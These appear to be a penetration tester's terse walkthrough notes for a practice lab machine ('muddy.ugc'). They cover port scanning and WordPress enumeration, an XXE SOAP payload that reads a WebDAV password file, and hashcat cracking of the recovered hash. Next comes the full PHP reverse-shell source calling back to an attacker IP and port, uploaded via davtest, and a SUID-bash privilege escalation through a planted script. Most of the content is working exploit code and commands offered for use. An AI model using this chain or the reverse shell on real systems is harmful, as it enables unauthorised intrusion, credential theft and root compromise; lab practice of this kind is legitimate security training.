IP:192.168.207.161
___
## Nmap 
```bash
sudo nmap -p- -sV -sS -T4 -vv 192.168.158.161 
```

```results
PORT     STATE SERVICE       REASON         VERSION
22/tcp   open  ssh           syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp   open  smtp          syn-ack ttl 61 Exim smtpd
80/tcp   open  http          syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
111/tcp  open  rpcbind       syn-ack ttl 61 2-4 (RPC #100000)
443/tcp  open  https?        syn-ack ttl 61
808/tcp  open  ccproxy-http? syn-ack ttl 61
908/tcp  open  unknown       syn-ack ttl 61
8888/tcp open  http          syn-ack ttl 61 WSGIServer 0.1 (Python 2.7.16)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Nmap NSE

### ~~SMTP~~
```bash
nmap 192.168.158.161  -p25 -sV -vv -T4 --script=smtp-* -oN smtp.txt
```

```results
n/a
```
CVE-2010-4344
___

> [!NOTE]
> 80/tcp   open  http          syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))

```bash
wpscan --url http://muddy.ugc/ -e u 
```

```results
[+] WordPress version 5.7 identified (Insecure, released on 2021-03-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://muddy.ugc/index.php/feed/, <generator>https://wordpress.org/?v=5.7</generator>
 |  - http://muddy.ugc/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.7</generator>

http://muddy.ugc/wp-content/themes/shapely/readme.txt
```

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://muddy.ugc/ -H "Host:FUZZ.muddy.ugc" -fs 0
```

```results
n/a
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt:FFUZ -u http://muddy.ugc/FFUZ
```

```results
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 3511ms]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 4491ms]
javascript              [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 87ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 95ms]
webdav                  [Status: 401, Size: 456, Words: 42, Lines: 15, Duration: 110ms]
wp-admin                [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 92ms]
wp-content              [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 91ms]
wp-includes             [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 86ms]
```

___

> [!NOTE]
> 8888/tcp open  http          syn-ack ttl 61 WSGIServer 0.1 (Python 2.7.16)

## searchsploit Ladon 
```bash
cat /usr/share/exploitdb/exploits/xml/webapps/43113.txt
```

```results
POST /muddy/soap11 HTTP/1.1
Host: muddy.ugc:8888
User-Agent: curl/7.87.0
Accept: */*
Content-Type: text/xml;charset=UTF-8
SOAPAction: "http://muddy.ugc:8888/muddy/soap11/sayhello"
Content-Length: 548
Connection: close

<?xml version="1.0"?>
<!DOCTYPE uid
[
<!ENTITY passwd SYSTEM "file:/var/www/html/webdav/passwd.dav">
]>
<soapenv:Envelope
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xmlns:xsd="http://www.w3.org/2001/XMLSchema"
	xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
	xmlns:urn="urn:HelloService">
	<soapenv:Header/>
	<soapenv:Body>
		<urn:checkout soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
			<uid xsi:type="xsd:string">&passwd;</uid>
		</urn:checkout>
	</soapenv:Body>
</soapenv:Envelope>
```

# Hashcat
```bash
administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0
```

```bash
hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt.gz
```

```results
administrant:sleepless
```

# Webdav RCE

```bash
davtest -url http://muddy.ugc/webdav/ -auth administrant:sleepless
```

```bash
EXEC    php     SUCCEED:        http://muddy.ugc/webdav/DavTestDir_hlTsp6BED_g_B/davtest_hlTsp6BED_g_B.php
```

#### PHP REVERS SHELL 
```bash
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.45.155';
$port = 1337;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

## davtest

```bash
davtest -url http://muddy.ugc/webdav/ -auth administrant:sleepless -uploadfile /tmp/shell.php -uploadloc shell.php
```

# LPE
## WP-CONFIG

```bash
/var/www/html/wp-config.php
```

```results
/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ec99e2a005aa8cf0550ddfbdcde11141' );
```

```bash
hashcat -m 0 hash2.txt /usr/share/wordlists/rockyou.txt.gz
```

```bash
n/a
```

# ROOT
```bash
echo '#!/bin/bash' > /dev/shm/netstat
echo 'chmod u+s /bin/bash'  >> /dev/shm/netstat
```

```resulst
cat /dev/shm/netstat
#!/bin/bash
chmod u+s /bin/bash
```

```bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

```bash
/bin/bash -p
```